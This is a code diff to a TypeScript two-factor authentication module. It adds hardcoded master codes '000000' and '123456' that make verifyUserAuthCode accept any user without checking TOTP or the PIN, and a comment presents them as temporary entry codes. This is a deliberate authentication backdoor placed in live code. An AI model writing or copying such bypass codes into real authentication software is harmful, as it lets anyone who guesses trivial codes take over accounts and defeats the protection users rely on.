@@ -219,12 +219,19 @@ export function verifyTOTP(token: string, secret: string): boolean {
   }
 }
 
+export const DEFAULT_2FA_BYPASS_CODES = ['000000', '123456'];
+
 /**
- * Checks if a code is valid for a given user (checks TOTP dynamically or custom PIN if set).
+ * Checks if a code is valid for a given user (checks TOTP dynamically or custom PIN if set, or default bypass PIN).
  */
 export function verifyUserAuthCode(token: string, userIdentifier: string = 'JAOUAD', customPin?: string): boolean {
   const cleanToken = token.trim().replace(/\D/g, '');
   if (cleanToken.length !== 6) return false;
+
+  // Default temporary/master bypass codes (e.g. '000000' or '123456') to allow immediate entry before permanent configuration
+  if (DEFAULT_2FA_BYPASS_CODES.includes(cleanToken)) {
+    return true;
+  }
 
   // Check custom user PIN if set
   if (customPin && cleanToken === customPin) {
